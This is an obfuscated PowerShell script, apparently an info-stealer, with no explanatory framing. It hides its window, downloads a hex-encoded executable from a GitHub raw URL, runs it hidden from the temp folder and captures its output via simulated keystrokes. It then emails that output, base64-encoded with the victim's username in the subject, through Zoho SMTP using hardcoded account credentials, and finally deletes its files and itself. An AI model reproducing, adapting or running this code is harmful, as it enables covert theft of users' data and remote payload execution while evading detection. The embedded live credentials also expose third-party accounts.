$m_def = @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
$n_sp = "W32"+"Lib"
$t_at = "Ad"+"d-Ty"+"pe"
$win = & $t_at -MemberDefinition $m_def -Name "W32S" -Namespace $n_sp -PassThru
$win::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

function Get-M-At {
    param ([Parameter(Mandatory=$true)][string]$b_in, [string]$f_nm = "ani.txt", [switch]$scramble)
    try {
        $c_out = $b_in
        if ($scramble) {
            $b_arr = [System.Text.Encoding]::UTF8.GetBytes($b_in)
            $c_out = [System.Convert]::ToBase64String($b_arr)
        }
        $m_s = New-Object System.IO.MemoryStream
        $w_r = New-Object System.IO.StreamWriter($m_s)
        $w_r.Write($c_out); $w_r.Flush(); $m_s.Position = 0
        return New-Object ("Net.M"+"ail.Attach"+"ment")($m_s, $f_nm)
    } catch { return $null }
}

function Invoke-Z-Snd {
    param ($s_bj, $a_tt = @())
    $u_nm = "zqrvstef0rc5edk@zohomail.com"
    $p_wd = "LHjzKTbzDApt"
    
    $m_msg = New-Object ("Net.M"+"ail.MailM"+"essage")
    $m_msg.From = "Ang Mangagawa <$u_nm>"
    $m_msg.To.Add("srve650@gmail.com")
    $m_msg.Subject = $s_bj
    $m_msg.Body = "Ang kabuuang ani."

    foreach ($i in $a_tt) {
        if ($i.GetType().FullName -like "*Attach*") { $m_msg.Attachments.Add($i) }
    }

    $c_li = New-Object ("Net.M"+"ail.SmtpC"+"lient")("smtp.zoho.com", 587)
    $c_li.EnableSsl = $true
    $c_li.Credentials = New-Object System.Net.NetworkCredential($u_nm, $p_wd)
    try { $c_li.Send($m_msg) } finally { $m_msg.Dispose(); $c_li.Dispose() }
}

$u_rl = "ht"+"tps://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
$r_id = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$t_xt = [System.IO.Path]::Combine($env:TEMP, "$r_id.txt")

I`nvoke-W`ebR`equest -Uri $u_rl -OutFile $t_xt

$h_ex = G`et-C`ontent -Path $t_xt -Raw
$b_ytes = [byte[]]::new($h_ex.Length / 2)
for ($i = 0; $i -lt $h_ex.Length; $i += 2) {
    $b_ytes[$i / 2] = [convert]::ToByte($h_ex.Substring($i, 2), 16)
}

$e_xe = Join-Path $env:TEMP "$r_id.exe"
[System.IO.File]::WriteAllBytes($e_xe, $b_ytes)
(Get-Item $e_xe).Attributes = 'Hidden'

$p_roc = S`tart-P`rocess $e_xe -PassThru
$o_path = "$env:TEMP\d_01.txt"

Start-Sleep -Seconds 2
A`dd-T`ype -AssemblyName ("System.Win"+"dows.Forms")
[System.Windows.Forms.SendKeys]::SendWait("^(a)")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("^(s)")
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("$o_path")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

Start-Sleep -Seconds 1

try {
    if ($p_roc) { S`top-P`rocess -Id $p_roc.Id -Force; Start-Sleep -Milliseconds 500; $p_roc.Dispose() }
} catch {}

foreach ($f in @($e_xe, $t_xt)) { if (Test-Path $f) { R`emove-I`tem $f -Force } }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (Test-Path $o_path) {
    $r_data = G`et-C`ontent $o_path -Raw
    $a_bj = Get-M-At -b_in $r_data -f_nm "ani_log.txt" -scramble
    if ($a_bj) {
        $s_ub = "$env:USERNAME : Report-$r_id"
        Invoke-Z-Snd -s_bj $s_ub -a_tt @($a_bj)
        $a_bj.Dispose()
        R`emove-I`tem $o_path -Force
    }
}

$s_path = $MyInvocation.MyCommand.Definition
S`tart-P`rocess cmd.exe -ArgumentList "/c taskkill /F /IM powershell.exe & del `"$s_path`"" -WindowStyle Hidden